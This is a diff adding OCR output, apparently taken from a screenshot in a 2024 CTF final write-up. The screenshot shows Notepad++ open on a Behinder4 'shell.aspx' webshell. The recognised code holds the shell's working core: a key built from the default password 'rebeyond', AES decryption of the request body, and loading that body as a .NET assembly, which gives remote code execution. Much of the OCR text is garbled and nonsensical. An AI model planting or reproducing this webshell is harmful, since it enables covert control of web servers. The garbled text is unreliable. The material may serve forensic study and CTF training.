@@ -1,0 +1,16 @@
+# OCR: cf4a081ff64478f3f1c6bd45005a1086.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/cf4a081ff64478f3f1c6bd45005a1086.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:16
+
+CMyApp/SafeToolsiONE-FOX姚成工具_V7公开服_byEigui_webshell,Behinder4)server/shel.aspx·Notepad++ 文件(F)编(E)魔素(5)现要V)编码(N)
+会(M)运行(R)插件(P)断口(W)
+)
+mo)
+DaHealeacaaagaam shelaspx
+kse Page Language="c"&><seImport Namespace="system.Reflection"s><esession.Add("k"
+默认连接密码rebeyond*/byte门]
+"e450329Fab5a925b
+率帮为连费带32m5值的商1收：
+Encoding.Default.GetBytes(Session[o)+wm),c=Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k,k F,TransformFinalBiock(c,0,c.Length)),CreateInstance("u").Equals(this);>
